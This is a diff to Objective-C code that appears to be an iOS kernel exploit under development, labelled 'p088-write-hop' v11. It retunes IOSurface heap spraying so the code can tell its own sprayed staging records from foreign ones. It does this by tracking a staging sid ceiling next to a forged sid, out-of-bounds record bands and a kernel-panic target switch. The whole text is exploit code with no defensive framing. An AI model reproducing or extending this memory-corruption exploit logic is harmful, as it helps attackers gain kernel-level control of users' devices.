@@ -181,7 +181,7 @@
 #import <string.h>
 #import <unistd.h>
 
-#define P088_BUILD @"p088-write-hop-v10-fresA"
+#define P088_BUILD @"p088-write-hop-v11-stageband"
 
 /* kernel-target tap: 0 = in-process T (safe-ish), 1 = kernel sid (PANIC) */
 #define P088_KERNEL_TARGET 0
@@ -272,6 +272,14 @@ static int      g_p088_hitOurs = 0;   /* set by p088_harvest_one on a hit */
    forgeSid) vs foreign driver-bound sids (175-561 band tonight). */
 static uint32_t g_p088_minGateSid = 0;
 static uint32_t g_p088_maxGateSid = 0;
+/* v11: the fresh-A instance allocates ~250 NEW staging IOSurfaces per round
+   (ids above the gate pool — 824..1067 tonight) and the record stream's sids
+   are THOSE (sid reuse on instance release makes rounds identical). The v10
+   static band (gate pool + ~175-561 foreign) misread OUR tables as foreign,
+   so hitOurs stayed 0, the witness never armed, and B fired 0 times.
+   g_p088_stageMax is extended by every p088_stage_scan hit; ours-census =
+   sid in [minGateSid .. stageMax] or == forgeSid. */
+static uint32_t g_p088_stageMax = 0;
 static uint32_t g_p088_lastOurBand = 0;   /* census of the last harvested hit */
 static uint32_t g_p088_ourBandTotal = 0;  /* cumulative across the tap */
 /* v9 zone-cookie census: records whose symbolIndex byte sits in 0xC0..0xFF
@@ -473,8 +481,11 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
                foreign tables carry driver-bound sids (175-561 tonight). */
             uint32_t rsid = (uint32_t)q[w - 1];
             uint32_t rsym = (uint32_t)(q[w - 1] >> 32);
-            if ((g_p088_maxGateSid && rsid >= g_p088_minGateSid &&
-                 rsid <= g_p088_maxGateSid) || rsid == g_p088_forgeSid)
+            /* v11 ours-census: gate pool band, or staging band (fresh-A
+               staging grows g_p088_stageMax each round's stage scan —
+               v10 proved the fills carry those sids), or == forgeSid. */
+            if ((g_p088_minGateSid && rsid >= g_p088_minGateSid &&
+                 rsid <= g_p088_stageMax) || rsid == g_p088_forgeSid)
                 ourBand++;
             /* v9 zone-cookie: symbolIndex 0xC0..0xFF = OOB record band. */
             if (rsym >= 0xC0u && rsym <= 0xFFu) cookieBand++;
@@ -494,8 +505,8 @@ static int p088_harvest_one(p088_held_t *v, const char *label) {
         for (uint32_t w = 1; w < nq && shown < 3; w++) {
             if (q[w] == P088_FILL_FLAG) {
                 uint32_t rsid = (uint32_t)q[w - 1];
-                BOOL ours = (g_p088_maxGateSid && rsid >= g_p088_minGateSid &&
-                             rsid <= g_p088_maxGateSid) || rsid == g_p088_forgeSid;
+                BOOL ours = (g_p088_minGateSid && rsid >= g_p088_minGateSid &&
+                             rsid <= g_p088_stageMax) || rsid == g_p088_forgeSid;
                 p088_log(@"      rec sid=%u symbol=0x%08x %@%@",
                          rsid, (uint32_t)(q[w - 1] >> 32),
                          ours ? @"OURS-BAND" : @"foreign-band",
@@ -570,6 +581,7 @@ static void p088_stage_scan(uint32_t *hiSeen) {
         if (sz == P088_STAGE_SIZE) {
             hits++;
             if (hi + k > *hiSeen) *hiSeen = hi + k;
+            if (hi + k > g_p088_stageMax) g_p088_stageMax = hi + k;
             if (s_iosLock(s, 0, NULL) == KERN_SUCCESS) {
                 const uint8_t *b = (const uint8_t *)s_iosBase(s);
                 if (b && sz >= 16) {
@@ -808,8 +820,9 @@ static NSString *p088_yfmt(double y) {
         if (gs[i].sid < g_p088_minGateSid) g_p088_minGateSid = gs[i].sid;
         if (gs[i].sid > g_p088_maxGateSid) g_p088_maxGateSid = gs[i].sid;
     }
-    p088_log(@"[+] D2 census band: %u..%u (+forge %u; foreign band ~175-561)",
-             g_p088_minGateSid, g_p088_maxGateSid, forgeSid);
+    g_p088_stageMax = hiSeen;   /* v11: ours-census ceiling starts at the gate band */
+    p088_log(@"[+] D2 census band: %u..%u + staging up to %u (+forge %u; foreign band ~175-561)",
+             g_p088_minGateSid, g_p088_maxGateSid, g_p088_stageMax, forgeSid);
 
     /* ---- PHASE G: engagement gate (127-in live sids, P082/P080 shape) ---- */
     double gvals[P088_GATE_N];
